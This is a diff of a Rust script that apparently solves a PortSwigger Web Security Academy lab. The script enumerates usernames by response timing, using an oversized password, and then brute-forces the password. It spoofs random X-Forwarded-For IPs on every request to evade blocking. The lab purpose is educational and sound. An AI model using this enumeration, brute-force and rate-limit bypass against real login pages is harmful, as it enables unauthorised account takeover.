@@ -2,9 +2,9 @@
 *
 * Author: Ahmed Elqalawii
 *
-* Date: 25/8/2023
+* Date: 27/8/2023
 *
-* PortSwigger LAB: Username enumeration via different responses
+* PortSwigger LAB: Username enumeration via response timing
 *
 * Steps: 1. Enum usernames to get a valid one
 *        2. Brute force the valid username password
@@ -16,6 +16,7 @@
 ***********/
 use atomic_counter::{self, RelaxedCounter};
 use lazy_static::lazy_static;
+use rand::Rng;
 use rayon::{
     current_thread_index,
     prelude::{IntoParallelRefIterator, ParallelIterator},
@@ -59,7 +60,7 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a05005e049bcd7980fca3e300e3002d.web-security-academy.net/login"; // change this to you lab url
+    let url = "https://0abe0006040e351c82879dca001400df.web-security-academy.net/login"; // change this to you lab url
     let client = build_client(); // client will be used on subsequent requests
 
     let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();
@@ -107,7 +108,7 @@ fn main() {
 ********************************************************************/
 fn build_client() -> Client {
     ClientBuilder::new()
-        .timeout(Duration::from_secs(5))
+        .timeout(Duration::from_secs(15))
         .redirect(Policy::none())
         .build()
         .unwrap()
@@ -152,25 +153,32 @@ fn enum_usernames(
                     total_counts,
                     user,
                 );
-                let data = HashMap::from([("username", user), ("password", &"not important now")]); // the data sent in the POST login request
-                let mut login = client.post(url).form(&data).send(); // try to login
+                let big_password = "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw";
+                let data = HashMap::from([("username", user), ("password", &big_password)]); // the data sent in the POST login request
+                let mut request_start_time = Instant::now();
+                let mut login = client.post(url)
+                    .form(&data)
+                    .header("X-Forwarded-For", get_random_ip()) // change IP in every request to avoid blocking
+                    .send(); // try to login
                 if let Ok(res) = login {
+                    let request_elapsed_time = request_start_time.elapsed().as_secs(); // calculate the time completion of the request
                     // check if the request was sent successfully
                     USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to the succeeded counter
-                    let body = &res.text().unwrap(); // get the body of the response
-                    let pattern_existance = regex.find(body); // search for the pattern
-                    if pattern_existance.is_none() {
-                        // if the patttern doesn't exist
+                    if request_elapsed_time > 5 { // if the response take more than 5 seconds; an indicator of a success username
                         VALID_USER.lock().unwrap().push_str(user); // change this global varaible to the valid user; this is the thread-safe operation using mutexes
                     }
                 } else {
                     // if the request faild for unknown reason try to send it again
-                    login = client.post(url).form(&data).send();
+                    let request_elapsed_time = request_start_time.elapsed().as_secs();
+
+                    login = client.post(url)
+                        .form(&data)
+                        .header("X-Forwarded-For", get_random_ip())
+                        .send(); 
                     if let Ok(res) = login {
+                        let request_elapsed_time = request_start_time.elapsed().as_secs();
                         USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
-                        let body = &res.text().unwrap();
-                        let pattern_existance = regex.find(body);
-                        if pattern_existance.is_none() {
+                        if request_elapsed_time > 5  {
                             VALID_USER.lock().unwrap().push_str(user);
                         }
                     } else {
@@ -234,7 +242,11 @@ fn brute_force_password(
                     password,
                 );
                 let data = HashMap::from([("username", valid_user), ("password", password)]); // the POST date to submit
-                let mut login = client.post(url).form(&data).send(); // try to login
+                let mut login = client
+                    .post(url)
+                    .form(&data)
+                    .header("X-Forwarded-For", get_random_ip()) // change IP in every request to avoid blocking
+                    .send(); // try to login
                 if let Ok(res) = login {
                     // if the request succeeded
                     if res.status().as_u16() == 302 {
@@ -243,7 +255,11 @@ fn brute_force_password(
                     }
                 } else {
                     // if the request faild for unknown reason try to send it again
-                    login = client.post(url).form(&data).send();
+                    login = client
+                        .post(url)
+                        .form(&data)
+                        .header("X-Forwarded-For", get_random_ip())
+                        .send();
                     if let Ok(res) = login {
                         if res.status().as_u16() == 302 {
                             VALID_PASSWORD.lock().unwrap().push_str(password)
@@ -368,4 +384,15 @@ fn save_results(start_time: Instant, file_name: &str) {
     } else {
         println!("\n{}", "[!] Couldn't create new file to save results".red());
     }
+}
+
+/*************************************************
+* Function used to generate random IP on each call
+**************************************************/
+fn get_random_ip() -> String {
+    let a = rand::thread_rng().gen_range(2..254);
+    let b = rand::thread_rng().gen_range(2..254);
+    let c = rand::thread_rng().gen_range(2..254);
+    let d = rand::thread_rng().gen_range(2..254);
+    format!("{a}.{b}.{c}.{d}")
 }
